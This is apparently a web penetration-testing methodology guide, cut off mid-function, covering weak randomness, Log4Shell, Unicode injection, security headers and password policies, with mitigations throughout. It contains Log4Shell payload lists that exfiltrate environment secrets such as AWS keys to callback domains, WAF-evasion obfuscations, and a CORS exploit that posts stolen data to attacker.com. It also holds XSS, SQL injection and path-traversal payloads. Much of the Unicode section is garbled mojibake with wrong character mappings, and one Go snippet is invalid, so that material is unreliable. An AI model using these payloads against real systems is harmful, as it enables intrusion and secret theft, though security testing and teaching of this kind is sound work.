## 1. Predictable Random Values

### Theory

Applications use random values in many security-critical flows such as password recovery, session generation, tokens, and identifiers. When these values can be predicted, applications become vulnerable to various attacks including session hijacking, account takeover, and authentication bypass.

**Conditions that enable prediction:**

- Insufficient length of generated values (typically < 16 bytes)
- Short alphabet used for generation
- Static values used as seeds
- Easily guessable values (e.g., timestamps)
- Statistical random number generators whose output can be reproduced
- Predictable UUID/GUID versions (v1, v3, v5)

### Exploitation Methods

#### Identifying Weak Random Generation

**Step 1: Collect multiple samples**
- Generate 10-20 tokens/values from the same endpoint
- Record timestamps for each generation
- Look for patterns in structure, length, or content

**Step 2: Analyze patterns**
- Check length consistency
- Identify character set used
- Look for embedded timestamps or sequential numbers
- Test for UUID version (check character after second hyphen)

**Step 3: Attempt prediction**
- For timestamp-based: generate tokens at precise times
- For sequential: calculate next values
- For weak RNGs: use cracking tools

#### Language-Specific Weak Generators

**Go - Weak Generation:**
```go
// Vulnerable
import "math/rand"
token := rand.Intn(1000000)
```

**Go - Secure Generation:**
```go
// Secure
import "crypto/rand"
b := make([]byte, 16)
crypto/rand.Read(b)
```

**Java - Weak Generation:**
```java
// Vulnerable
java.util.Random random = new java.util.Random();
int token = random.nextInt();

// Vulnerable
org.apache.commons.lang3.RandomStringUtils.randomAlphanumeric(16);
```

**Java - Secure Generation:**
```java
// Secure
java.security.SecureRandom secureRandom = new java.security.SecureRandom();
byte[] token = new byte[16];
secureRandom.nextBytes(token);
```

**Node.js - Weak Generation:**
```javascript
// Vulnerable
const token = Math.random().toString(36);
```

**Node.js - Secure Generation:**
```javascript
// Secure
const crypto = require('crypto');
const token = crypto.randomBytes(16).toString('hex');
```

**Python - Weak Generation:**
```python
# Vulnerable
import random
token = random.randint(1000000, 9999999)
```

**Python - Secure Generation:**
```python
# Secure
import secrets
token = secrets.token_hex(16)
```

**Ruby - Weak Generation:**
```ruby
# Vulnerable
token = Random.rand(1000000)
token = Kernel.rand(1000000)
```

**Ruby - Secure Generation:**
```ruby
# Secure
require 'securerandom'
token = SecureRandom.hex(16)
```

### UUID/GUID Vulnerabilities

**UUID Format:**
```
123e4567-e89b-12d3-a456-426614174000
         ↑
    Version number
```

**Predictable Versions:**

- **Version 0**: Nil UUID `00000000-0000-0000-0000-000000000000`
- **Version 1**: Based on timestamp + MAC address + clock sequence
- **Version 3**: MD5 hash of namespace + name
- **Version 5**: SHA1 hash of namespace + name

**Version 4 (Secure):** Randomly generated

**Exploiting Version 1 UUIDs:**

```bash
# Using guidtool to generate v1 UUIDs
guidtool -t "2024-01-15 10:30:00" -s "bcd510ca-3357-48d7-8e3f-1206b9c09632"
```

**Testing UUID predictability:**
1. Generate multiple UUIDs from the application
2. Identify the version (check position after second hyphen)
3. For v1: extract timestamp and MAC components
4. Use tools like guidtool to generate valid UUIDs for target timeframes

### Higher Impact Scenarios

**Session Hijacking:**
- Predict session IDs of other users
- Gain unauthorized access to accounts

**Password Reset Token Prediction:**
- Generate valid reset tokens for target accounts
- Perform account takeover

**API Key Prediction:**
- Enumerate valid API keys
- Access protected resources

**Transaction ID Prediction:**
- Predict order/transaction IDs
- Access sensitive business data

### Mitigations

**For Developers:**
- Always use cryptographically secure random generators
- Minimum 16 bytes (128 bits) of entropy
- Use UUID v4 for unique identifiers
- Never use timestamps, sequential numbers, or user data as sole randomness source
- Implement rate limiting on token generation endpoints

**Secure Random Generation Summary:**
- Go: `crypto/rand`
- Java: `java.security.SecureRandom`
- Node.js: `crypto.randomBytes()`
- Python: `secrets` module
- Ruby: `SecureRandom`

---

## 2. Log4Shell (CVE-2021-44228)

### Theory

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2 (versions 2.0-beta9 to 2.14.1). The vulnerability allows attackers to execute arbitrary code by exploiting JNDI (Java Naming and Directory Interface) lookups in log messages.

**Attack Vector:** When user-controlled data is logged, malicious JNDI lookup strings trigger remote code execution.

### Exploitation Methods

#### Basic Testing

**Step 1: Identify injection points**
- URL parameters
- HTTP headers (User-Agent, Referer, X-Forwarded-For, etc.)
- POST data
- Cookies
- Any field that gets logged

**Step 2: Test with DNS/HTTP callback**

```bash
# Basic payload
${jndi:ldap://your-collaborator.com/a}

# With variable extraction
${jndi:ldap://${env:USER}.your-collaborator.com/a}
${jndi:ldap://${sys:java.version}.your-collaborator.com/a}
${jndi:ldap://${hostName}.your-collaborator.com/a}
```

**Step 3: Monitor callback**
- Use Burp Collaborator, Interactsh, or Canarytokens
- Check DNS/HTTP logs for incoming requests

#### Advanced Testing Techniques

**Automated Scanning:**

```bash
# Using httpx with multiple headers
cat targets.txt | httpx \
  -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.your-canary.com/a}' \
  -H 'User-Agent: ${jndi:ldap://x${hostName}.L4J.your-canary.com/a}' \
  -H 'Referer: ${jndi:ldap://x${hostName}.L4J.your-canary.com/a}' \
  -H 'X-Forwarded-For: ${jndi:ldap://x${hostName}.L4J.your-canary.com/a}'

# Using log4j-scan tool
python3 log4j-scan.py -u https://target.com --headers-file headers.txt
```

**Cookie-Based Testing:**

```http
GET / HTTP/1.1
Host: target.com
Cookie: session=xxx; tracking=${jndi:ldap://${sys:java.version}.L4J.your-canary.com/a}
```

**VMware vCenter Specific:**

```http
POST /analytics/telemetry/ph/api/hyper/send?_c=${jndi:ldap://${sys:java.version}.L4J.your-canary.com/a} HTTP/1.1
Host: vcenter.target.com
```

### Bypasses

**Obfuscation Techniques:**

```bash
# Case manipulation
${${lower:jndi}:${lower:ldap}://domain.com/a}
${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://domain.com/a}

# Environment variable bypass
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//domain.com/a}

# Date-based obfuscation
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://domain.com/a}

# Nested lookups
${jnd${upper:ı}:ldap://domain.com/a}
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://domain.com/a}

# Unicode bypass
${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.domain.com/a}

# Empty string bypass
${jn${env:::-}di:ldap://domain.com/a}

# URL encoded
%24%7Bjndi:ldap://domain.com/a%7D

# Multiple bypass layers
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://domain.com/a}
```

**WAF Bypass Collection:**

```bash
# No "ldap" string
${jndi:dns://domain.com/a}
${jndi:rmi://domain.com/a}

# Domain obfuscation
${jndi:ldap://127.0.0.1#domain.com/a}

# Complex nesting
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://domain.com/a}

# Environment variable that doesn't exist
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//domain.com/a}
```

### Payloads

**Top 10 Most Effective Payloads:**

```bash
# 1. Basic callback
${jndi:ldap://${hostName}.your-domain.com/a}

# 2. Java version extraction
${jndi:ldap://${sys:java.version}.your-domain.com/a}

# 3. Environment user extraction
${jndi:ldap://${env:USER}.your-domain.com/a}

# 4. AWS credentials extraction
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.your-domain.com/a}

# 5. Docker container info
${jndi:ldap://${docker:containerId}.your-domain.com/a}

# 6. Kubernetes pod info
${jndi:ldap://${k8s:podName}.your-domain.com/a}

# 7. Simple WAF bypass
${${lower:jndi}:${lower:ldap}://your-domain.com/a}

# 8. Environment bypass
${${env:NaN:-j}ndi${env:NaN:-:}ldap://your-domain.com/a}

# 9. DNS-based (works when LDAP blocked)
${jndi:dns://your-domain.com/a}

# 10. RMI alternative
${jndi:rmi://your-domain.com/a}
```

**Information Extraction Payloads:**

```bash
# Docker lookups
${jndi:ldap://${docker:containerName}.domain.com/a}
${jndi:ldap://${docker:imageName}.domain.com/a}

# Kubernetes lookups
${jndi:ldap://${k8s:accountName}.domain.com/a}
${jndi:ldap://${k8s:clusterName}.domain.com/a}
${jndi:ldap://${k8s:namespaceId}.domain.com/a}

# Java environment
${jndi:ldap://${java:version}.domain.com/a}
${jndi:ldap://${java:runtime}.domain.com/a}
${jndi:ldap://${java:os}.domain.com/a}

# System properties
${jndi:ldap://${sys:java.vendor}.domain.com/a}
${jndi:ldap://${sys:user.name}.domain.com/a}

# Web application context
${jndi:ldap://${web:contextPath}.domain.com/a}
${jndi:ldap://${web:serverInfo}.domain.com/a}
```

### Higher Impact Scenarios

**Data Exfiltration:**
- Extract environment variables containing secrets
- Leak AWS/Azure credentials
- Obtain database connection strings
- Extract API keys and tokens

**Remote Code Execution:**
- Deploy webshell
- Execute system commands
- Install persistence mechanisms
- Pivot to internal network

**Lateral Movement:**
- Compromise adjacent services
- Access internal APIs
- Exploit trust relationships

### Common Headers to Test

```
Accept
Accept-Charset
Accept-Encoding
Accept-Language
Authorization
Cache-Control
CF-Connecting-IP
Client-IP
Contact
Cookie
Destination
Forwarded
Forwarded-For
From
Origin
Referer
User-Agent
X-Api-Version
X-Client-IP
X-Correlation-ID
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Port
X-Forwarded-Proto
X-Forwarded-Server
X-Real-IP
X-Remote-IP
X-Request-ID
X-XSRF-TOKEN
```

### Mitigations

**Immediate:**
- Upgrade Log4j to version 2.17.1 or later
- Set `log4j2.formatMsgNoLookups=true`
- Remove `JndiLookup` class: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

**Long-term:**
- Implement WAF rules
- Network segmentation
- Restrict outbound LDAP/RMI/DNS
- Monitor for JNDI lookup patterns
- Regular dependency scanning

---

## 3. Unicode Injection

### Theory

Unicode injection occurs when applications improperly handle Unicode characters, leading to unexpected transformations that can bypass security controls. The vulnerability arises from:

- Unicode normalization converting special characters to ASCII
- Encoding mismatches during processing
- Best-fit character mapping in Windows
- Emoji rendering and conversion

### Exploitation Methods

#### Unicode Normalization Attacks

**Step 1: Identify normalization points**
- Look for input processing that converts case (uppercase/lowercase)
- Test fields that display user input
- Check API endpoints that transform data

**Step 2: Test with Unicode equivalents**

```
Normal char → Unicode equivalent
<           → \u3c4b, \uff1c, \u2039
>           → \u3e4d, \uff1e, \u203a
'           → \u02bc, \uff07, \u2019
"           → \uff02, \u201c, \u201d
/           → \uff0f, \u2044, \u2215
\           → \uff3c, \u2216, \ufe68
```

**Step 3: Monitor transformation**
- Submit Unicode characters
- Observe how they're processed
- Check if dangerous characters appear after normalization

#### `\u` to `%` Transformation

**Vulnerable Pattern:**
```
Input:  \u3c4b
Convert \u → %
Result: %3c4b
URL decode: <4b
```

**Exploitation:**
```html
<!-- Input -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- After transformation -->
<script>alert(1)</script>
```

**Character mapping examples:**
```
\u003c → %3c → 
\u003e → %3e → >
\u0022 → %22 → "
\u0027 → %27 → '
\u002f → %2f → /
```

#### Emoji Injection

**Vulnerable Processing Chain:**
1. Application receives emoji
2. Converts UTF-8 from Windows-1252 to UTF-8 (mismatch)
3. Produces weird Unicode like `â€¹`
4. Converts again from UTF-8 to ASCII
5. Normalizes `â€¹` to `<`

**Example Payload:**
```
ðŸ'‹img src=x onerror=alert(document.domain)//ðŸ'›
```

**PHP Vulnerable Code:**
```php
$str = isset($_GET["str"]) ? htmlspecialchars($_GET["str"]) : "";
$str = iconv("Windows-1252", "UTF-8", $str);
$str = iconv("UTF-8", "ASCII//TRANSLIT", $str);
echo "String: " . $str;
```

#### Windows Best-Fit Attacks

**Concept:** Windows automatically replaces Unicode characters that cannot be displayed in ASCII with similar characters during API calls from "W" (Unicode) to "A" (ASCII) versions.

**Common Best-Fit Mappings:**

```
Unicode → ASCII (Best-Fit)
U+FF0F  → / (0x2F)
U+2044  → / (0x2F)
U+2215  → / (0x2F)
U+FF3C  → \ (0x5C)
U+2216  → \ (0x5C)
U+FF02  → " (0x22)
```

**Path Traversal Bypass:**
```
# Blocked: ../../../etc/passwd
# Bypass using fullwidth solidus (U+FF0F):
..ï¼/.ï¼/.ï¼/etc/passwd
```

**Command Injection Bypass:**
```php
# PHP escapeshellarg bypass
$cmd = escapeshellarg($user_input);

# Input with fullwidth quotation mark (U+FF02)
user_inputï¼mouse.exe

# After best-fit transformation becomes:
"mouse.exe"
# Which breaks into two arguments
```

### Bypasses

**XSS via Unicode Normalization:**

```html
<!-- Method 1: Unicode to ASCII transformation -->
\u003cscript\u003ealert(1)\u003c/script\u003e

<!-- Method 2: Fullwidth characters -->
ï¼œscriptï¼žalert(1)ï¼œ/scriptï¼ž

<!-- Method 3: Mathematical alphanumeric -->
ð¬'ð¬œð¬"ð¬©ð¬°ð¬­>alert(1)</ð¬'ð¬œð¬"ð¬©ð¬°ð¬­>

<!-- Method 4: Emoji injection -->
ðŸ'‹img src=x onerror=alert(1)//ðŸ'›
```

**Path Traversal via Best-Fit:**

```bash
# Using various slash alternatives
/etc/passwdï¼(U+FF0F)
/etc/passwdâ„(U+2044)
/etc/passwdâˆ•(U+2215)

# Using backslash alternatives
C:ï¼¼Windowsï¼¼System32 (U+FF3C)
C:âˆ–Windowsâˆ–System32 (U+2216)
```

**Command Injection via Best-Fit:**

```python
# Python subprocess.run with list
# Input with fullwidth quote
input = 'testï¼file.txt'

# After Windows best-fit
# Becomes: test"file.txt
# Breaking argument parsing
```

**SQL Injection via Unicode:**

```sql
-- Using fullwidth characters
ï¼‡ OR 1=1 --

-- Using mathematical bold
ðŽ²ðŽ· 1=1 --

-- Using Unicode normalization
\u0027 OR 1=1 --
```

### Payloads

**XSS Payloads:**

```html
# 1. Basic Unicode escape
\u003cimg src=x onerror=alert(1)\u003e

# 2. Fullwidth HTML
ï¼œimgï¼ssrc=xï¼sonerror=alert(1)ï¼ž

# 3. Mathematical alphanumeric script tag
ð¬'ð¬œð¬"ð¬©ð¬°ð¬­>alert(document.domain)</ð¬'ð¬œð¬"ð¬©ð¬°ð¬­>

# 4. Mixed Unicode + normal
\u003cscript\u003ealert(String.fromCharCode(88,83,83))\u003c/script\u003e

# 5. Emoji-based
ðŸ'‹svg onload=alert(1)//ðŸ'›

# 6. Zero-width characters for obfuscation
<â€‹sâ€‹câ€‹râ€‹iâ€‹pâ€‹tâ€‹>alert(1)</sâ€‹câ€‹râ€‹iâ€‹pâ€‹tâ€‹>

# 7. Combining characters
<script>a\u0301lert(1)</script>

# 8. Homograph attack
<Ñ•cript>alert(1)</script>

# 9. Unicode normalization chain
\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E

# 10. Best-fit quote bypass
imgï¼src=xï¼onload=alert(1)
```

**Path Traversal Payloads:**

```bash
# Windows best-fit slashes
..ï¼/..ï¼/..ï¼/windows/win.ini
..â„/..â„/..â„/etc/passwd
..âˆ•/..âˆ•/..âˆ•/etc/shadow

# Mixed encoding
..%c0%afï¼..%c0%afï¼windows/system32

# Backslash alternatives
C:ï¼¼Windowsï¼¼System32ï¼¼config
C:âˆ–Windowsâˆ–win.ini
```

### Higher Impact Scenarios

**Authentication Bypass:**
- Unicode username causing collision with admin
- Case-folding bypassing username checks
- Best-fit transforming blacklisted characters

**Remote Code Execution:**
- Command injection via best-fit quote transformation
- Shell escape bypass using fullwidth characters
- Path traversal to write files in sensitive locations

**Data Exfiltration:**
- Path traversal to read configuration files
- Unicode normalization bypassing file extension checks
- Accessing restricted directories via best-fit transformations

**WAF/Filter Bypass:**
- Evading signature-based detection with Unicode variants
- Bypassing regex filters with normalization
- Circumventing blacklists using best-fit mappings

### Mitigations

**Input Validation:**
- Normalize all Unicode input early in processing
- Use strict allow-lists for acceptable characters
- Reject or encode unexpected Unicode ranges

**Encoding Consistency:**
- Use consistent encoding throughout the application
- Avoid mixing Windows-1252 and UTF-8
- Always specify encoding explicitly

**API Selection:**
- Use Unicode-aware APIs consistently (prefer "W" versions)
- Avoid automatic best-fit transformations
- Explicitly handle character set conversions

**Security Controls:**
- Implement input validation after all transformations
- Use context-aware output encoding
- Apply CSP to mitigate XSS impact
- Validate file paths after Unicode normalization

---

## 4. HTTP Security Headers

### Theory

HTTP security headers instruct browsers how to behave when handling website content. Proper configuration prevents exploitation of XSS, Man-in-the-Middle, clickjacking, and other client-side vulnerabilities.

### Critical Headers Overview

#### Strict-Transport-Security (STS/HSTS)

**Purpose:** Forces HTTPS-only access, prevents MITM attacks

**Directives:**
- `max-age`: Duration (seconds) to remember HTTPS requirement
- `includeSubDomains`: Apply to all subdomains
- `preload`: Include in browser preload lists

**Secure Configuration:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Insecure Configurations:**
```
# Too short duration
Strict-Transport-Security: max-age=3600

# Missing includeSubDomains
Strict-Transport-Security: max-age=31536000

# Completely missing (most critical)
```

#### X-Frame-Options (XFO)

**Purpose:** Prevents clickjacking (now obsolete, use CSP)

**Values:**
- `DENY`: Cannot be framed
- `SAMEORIGIN`: Only same-origin framing
- `ALLOW-FROM uri`: Obsolete, not supported

**Secure Configuration:**
```
X-Frame-Options: DENY
```

**Modern Alternative (CSP):**
```
Content-Security-Policy: frame-ancestors 'none'
```

#### X-Content-Type-Options (XCTO)

**Purpose:** Prevents MIME type sniffing attacks

**Value:**
- `nosniff`: Block requests with mismatched MIME types

**Secure Configuration:**
```
X-Content-Type-Options: nosniff
```

**Impact:** Prevents executing JavaScript when served with wrong Content-Type

#### Content-Security-Policy (CSP)

**Purpose:** Restricts resource loading, prevents XSS, data injection

**Key Directives:**
- `default-src`: Fallback for other directives
- `script-src`: JavaScript sources
- `style-src`: CSS sources
- `img-src`: Image sources
- `frame-ancestors`: Embedding restrictions
- `unsafe-inline`: Allows inline scripts (dangerous)
- `unsafe-eval`: Allows eval() (dangerous)

**Secure Configurations:**

```
# Strict CSP
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'

# With CDN
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'sha256-abc123'

# Nonce-based
Content-Security-Policy: script-src 'nonce-random123'
```

**Insecure Configurations:**

```
# Allows inline scripts
Content-Security-Policy: script-src 'unsafe-inline'

# Allows eval
Content-Security-Policy: script-src 'unsafe-eval'

# Wildcard subdomain
Content-Security-Policy: script-src *.example.com

# Missing default-src
Content-Security-Policy: script-src 'self'
```

#### X-XSS-Protection

**Purpose:** Legacy XSS filter (deprecated, harmful)

**Secure Configuration:**
```
X-XSS-Protection: 0
```

**Why disable:** Can introduce vulnerabilities, CSP is preferred

#### Cross-Origin-Resource-Sharing (CORS)

**Purpose:** Controls cross-origin resource access

**Key Headers:**
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`

**Secure Configurations:**

```
# Specific origin
Access-Control-Allow-Origin: https://trusted.example.com

# No credentials with wildcard
Access-Control-Allow-Origin: *
```

**Insecure Configurations:**

```
# Reflects any origin with credentials
Access-Control-Allow-Origin: [reflected-origin]
Access-Control-Allow-Credentials: true

# Null origin accepted
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true

# Wildcard with credentials (invalid but sometimes processed)
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Exploitation Methods

#### Missing HSTS

**Test:**
```bash
curl -I https://target.com | grep -i strict-transport-security
```

**Exploit:**
- Perform SSL stripping attack
- Intercept initial HTTP request
- Downgrade to HTTP

#### Weak CSP

**Test:**
```bash
curl -I https://target.com | grep -i content-security-policy
```

**Exploit unsafe-inline:**
```html
<script>alert(document.domain)</script>
```

**Exploit unsafe-eval:**
```html
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**Exploit wildcard sources:**
```html
<script src="https://attacker.example.com/xss.js"></script>
```

**Exploit JSONP endpoints:**
```html
<script src="https://trusted-cdn.com/jsonp?callback=alert"></script>
```

#### CORS Misconfiguration

**Test:**
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/data
```

**Exploit reflected origin:**
```javascript
fetch('https://target.com/api/data', {
  credentials: 'include'
}).then(r => r.text()).then(data => {
  fetch('https://attacker.com/?data=' + btoa(data));
});
```

#### Missing X-Frame-Options/frame-ancestors

**Test:**
```bash
curl -I https://target.com | grep -i x-frame-options
curl -I https://target.com | grep -i "frame-ancestors"
```

**Exploit:**
```html
<iframe src="https://target.com"></iframe>
<!-- Perform clickjacking attack -->
```

#### Missing X-Content-Type-Options

**Test:**
```bash
curl -I https://target.com/script.txt | grep -i x-content-type-options
```

**Exploit:**
```html
<script src="https://target.com/user_avatar.jpg"></script>
<!-- If image contains JavaScript and no nosniff, may execute -->
```

### Higher Impact Scenarios

**Complete Account Takeover via CORS:**
- Misconfigured CORS allows credential theft
- Exfiltrate session tokens
- Perform actions on behalf of victim

**XSS via CSP Bypass:**
- Weak CSP allows script execution
- Steal credentials, session tokens
- Perform phishing attacks
- Deploy keyloggers

**MITM via Missing HSTS:**
- Intercept first HTTP request
- Strip TLS, capture credentials
- Man-in-the-middle all traffic

**Clickjacking for Sensitive Actions:**
- Frame sensitive pages
- Trick users into clicking invisible elements
- Change passwords, delete accounts, transfer funds

### Bypasses

**CSP Bypasses:**

```javascript
// Via JSONP endpoint
<script src="//trusted.com/jsonp?callback=alert(1)//"></script>

// Via Angular template
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

// Via AngularJS in older versions
{{constructor.constructor('alert(1)')()}}

// Via base tag
<base href="https://attacker.com/">
<script src="/script.js"></script>

// Via iframe srcdoc
<iframe srcdoc="<script>alert(1)</script>"></iframe>

// Via service worker
navigator.serviceWorker.register('/sw.js')

// Via object tag
<object data="data:text/html,<script>alert(1)</script>">

// Via meta refresh
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

// Via link prefetch
<link rel="prefetch" href="https://attacker.com/capture.php?data=">
```

**CORS Bypasses:**

```
# Subdomain wildcard
Origin: https://evil.target.com

# Null origin
Origin: null

# Prefix matching
Origin: https://target.com.evil.com

# Suffix matching
Origin: https://eviltarget.com
```

### Mitigations

**HSTS:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
- Submit to HSTS preload list
- Apply to all subdomains
- Use at least 1 year max-age

**CSP:**
```
# Strict policy
Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self'; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'

# With nonce for inline scripts
Content-Security-Policy: script-src 'nonce-{random}'; object-src 'none'

# Report-only mode for testing
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```
- Never use `unsafe-inline` or `unsafe-eval`
- Use nonces or hashes for inline scripts
- Minimize trusted domains
- Use `report-uri` or `report-to` for monitoring
- Test with report-only mode first

**CORS:**
```
# Specific origin only
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Credentials: true

# Or use dynamic validation
if (origin in allowedOrigins) {
    Access-Control-Allow-Origin: origin
    Access-Control-Allow-Credentials: true
}
```
- Never reflect arbitrary origins with credentials
- Maintain strict allowlist
- Avoid null origin
- Don't use wildcard with credentials

**X-Frame-Options:**
```
X-Frame-Options: DENY
# Or use CSP
Content-Security-Policy: frame-ancestors 'none'
```
- Prefer CSP `frame-ancestors` over X-Frame-Options
- Use DENY unless framing is required
- If SAMEORIGIN needed, implement additional CSRF protections

**X-Content-Type-Options:**
```
X-Content-Type-Options: nosniff
```
- Always include on all responses
- Ensure correct Content-Type headers
- Particularly critical for user-uploaded content

**Complete Secure Header Set:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
X-XSS-Protection: 0
```

### Testing Tools

**Automated Scanners:**

```bash
# securityheaders.py
pip install securityheaders
securityheaders https://target.com

# Online scanner
# Visit: https://securityheaders.com/

# Manual curl inspection
curl -I https://target.com

# CSP Evaluator
# Visit: https://csp-evaluator.withgoogle.com/

# CORS Scanner
git clone https://github.com/chenjj/CORScanner
python cors_scan.py -u https://target.com
```

**Manual Testing Process:**

```bash
# 1. Check all security headers
curl -I https://target.com

# 2. Test CORS configuration
curl -H "Origin: https://evil.com" -H "Cookie: session=xyz" \
     -I https://target.com/api/endpoint

# 3. Test CSP with various payloads
# (Use browser console or Burp)

# 4. Test clickjacking
# Create HTML file with iframe

# 5. Test MIME sniffing
curl -I https://target.com/upload/file.jpg

# 6. Verify HSTS preload status
# Visit: https://hstspreload.org/
```

---

## 5. Password Security Policies

### Theory

Password policies define requirements for password creation and management. Weak policies allow easily guessable passwords that are vulnerable to brute force, dictionary, and credential stuffing attacks.

### Secure Password Requirements

**Standard User:**
- Minimum 12 characters
- At least 2 character types: uppercase, lowercase, numbers, special characters
- No common passwords (check against breach databases)
- No personal information (name, birthdate, etc.)

**Privileged User (Administrator):**
- Minimum 12-16 characters
- At least 3 character types: uppercase, lowercase, numbers, special characters
- Regular rotation (every 90 days)
- Cannot reuse last 5 passwords
- Multi-factor authentication required

**Additional Considerations:**
- Maximum length should be reasonable (64+ characters)
- No arbitrary composition rules that reduce entropy
- Password strength meter for user guidance
- Check against known breach databases (Have I Been Pwned)

### Exploitation Methods

#### Weak Policy Detection

**Step 1: Registration Testing**
```
Test passwords:
- "password" (too simple)
- "Pass1" (too short)
- "password123" (common pattern)
- "12345678" (sequential numbers)
- "aaaaaaaa" (repeating characters)
```

**Step 2: Identify Weaknesses**
- Minimum length < 8 characters
- No complexity requirements
- Accepts common passwords
- No rate limiting on attempts
- Policy only enforced client-side

**Step 3: Bypass Testing**

```javascript
// Client-side validation bypass
// Disable JavaScript
// Intercept request and modify
// Use Burp/proxy to send weak password directly

POST /register HTTP/1.1
Content-Type: application/json

{"username":"test","password":"123"}
```

#### Policy Bypass Techniques

**Front-End Only Validation:**
```bash
# Intercept registration request
# Modify password field to weak value
# Submit directly to API
```

**Password Reset Weakness:**
```bash
# Check if reset allows weaker passwords than registration
# Test if temporary passwords bypass policy
# Verify if old password can be reused
```

**Unicode/Special Character Bypass:**
```
# Test if Unicode characters count toward complexity
# Example: "Pass🔑1" might bypass checks
# Zero-width characters: "Pass\u200Bword1"
```

**Length Truncation:**
```
# Submit very long password
# Check if backend truncates silently
# "VeryLongPassword123!@#" might become "VeryLong"
```

### Higher Impact Scenarios

**Credential Stuffing Success:**
- Weak policies result in reused passwords
- Attackers use breach databases
- Mass account compromise

**Brute Force Feasibility:**
- Short minimum length = smaller keyspace
- No complexity = dictionary attacks work
- No rate limiting = unlimited attempts

**Privilege Escalation:**
- Weak admin passwords
- Account takeover of privileged users
- Complete system compromise

**Compliance Violations:**
- GDPR, PCI-DSS, HIPAA requirements
- Regulatory fines
- Legal liability

### Testing Checklist

**Policy Strength:**
- [ ] Minimum length ≥ 12 characters?
- [ ] Complexity requirements enforced?
- [ ] Common passwords blocked?
- [ ] Personal information rejected?
- [ ] Maximum length reasonable (≥64)?

**Enforcement:**
- [ ] Validated server-side?
- [ ] Cannot bypass with proxy/Burp?
- [ ] Password reset follows same rules?
- [ ] Temporary passwords not weak?
- [ ] Unicode tricks don't bypass?

**Additional Security:**
- [ ] Rate limiting on login attempts?
- [ ] Account lockout after failures?
- [ ] Multi-factor authentication available?
- [ ] Password breach database checking?
- [ ] Secure password storage (bcrypt/argon2)?

**User Experience:**
- [ ] Clear policy communication?
- [ ] Password strength meter?
- [ ] Helpful error messages?
- [ ] No arbitrary restrictions (e.g., "must change monthly")?

### Bypasses

**Client-Side Validation Bypass:**
```javascript
// Method 1: Disable JavaScript
// Method 2: Intercept with Burp
POST /api/register HTTP/1.1

{"password":"weak"}

// Method 3: Modify DOM
document.getElementById('password').pattern = '.*'
```

**Unicode Complexity Bypass:**
```
# Using zero-width characters to fake length
"Pass\u200B\u200B\u200B\u200B\u200B\u200B\u200Bword"

# Using fullwidth numbers/letters
"Pï½ï½"sword１２３"

# Using combining characters
"Password\u0301\u0301\u0301123"
```

**Password Reset Bypass:**
```
# If reset has weaker requirements
1. Initiate password reset
2. Use weak password in reset form
3. Gain access with weak credentials

# If temporary passwords are weak
1. Trigger password reset
2. Intercept temporary password email
3. Use weak temporary password
```

**Length Truncation:**
```
# Submit: "VerySecurePassword123!@#$%^&*()"
# Backend might truncate to: "VerySecur"
# Login with truncated version

POST /login HTTP/1.1

{"username":"test","password":"VerySecur"}
```

**Regex Bypass:**
```python
# If policy checks: /^(?=.*[A-Z])(?=.*[0-9]).{8,}$/
# Only checks presence, not enforcement
"A1bbbbbb"  # Passes but very weak
"Aaaaaaaaa1" # Passes but predictable
```

### Mitigations

**Strong Policy Configuration:**
```
Minimum Requirements:
- Length: 12+ characters (16+ for admin)
- Complexity: 3 of 4 types (upper, lower, number, special)
- Blocked: Top 10,000 common passwords
- Blocked: Personal information patterns
- Maximum: 128 characters minimum
```

**Server-Side Enforcement:**
```python
# Example in Python
import re
from passlib.hash import bcrypt

def validate_password(password, username, email):
    # Length check
    if len(password) < 12:
        return False, "Password must be at least 12 characters"
    
    # Complexity check
    complexity = 0
    if re.search(r'[A-Z]', password): complexity += 1
    if re.search(r'[a-z]', password): complexity += 1
    if re.search(r'[0-9]', password): complexity += 1
    if re.search(r'[^A-Za-z0-9]', password): complexity += 1
    
    if complexity < 3:
        return False, "Password must contain 3 of: uppercase, lowercase, numbers, special chars"
    
    # Common password check
    if password.lower() in COMMON_PASSWORDS:
        return False, "Password is too common"
    
    # Personal info check
    if username.lower() in password.lower():
        return False, "Password cannot contain username"
    
    # Breach database check (HIBP API)
